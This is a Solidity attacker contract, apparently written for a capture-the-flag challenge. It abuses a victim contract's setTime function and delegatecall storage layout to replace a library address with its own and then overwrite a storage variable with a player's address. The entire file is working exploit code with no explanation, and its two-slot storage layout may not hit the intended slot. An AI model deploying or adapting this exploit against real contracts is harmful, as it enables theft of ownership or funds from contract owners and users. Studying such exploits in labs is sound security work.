// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract TimeZoneFraud {

    address private temp;
    address public target;

    function setTime(uint _timeStamp) public {
        target = address(uint160(_timeStamp));
    }

    function stealLibrary(address victim, address player) public {
        address contractAdress = address(this);
        uint time = uint256(uint160(contractAdress));
        bytes4 setTimeSignature = bytes4(keccak256("setTime(uint256)"));
        victim.call(
            abi.encodePacked(setTimeSignature, time)
        );
        victim.call(
            abi.encodePacked(setTimeSignature, uint256(uint160(player)))
        );
    }
}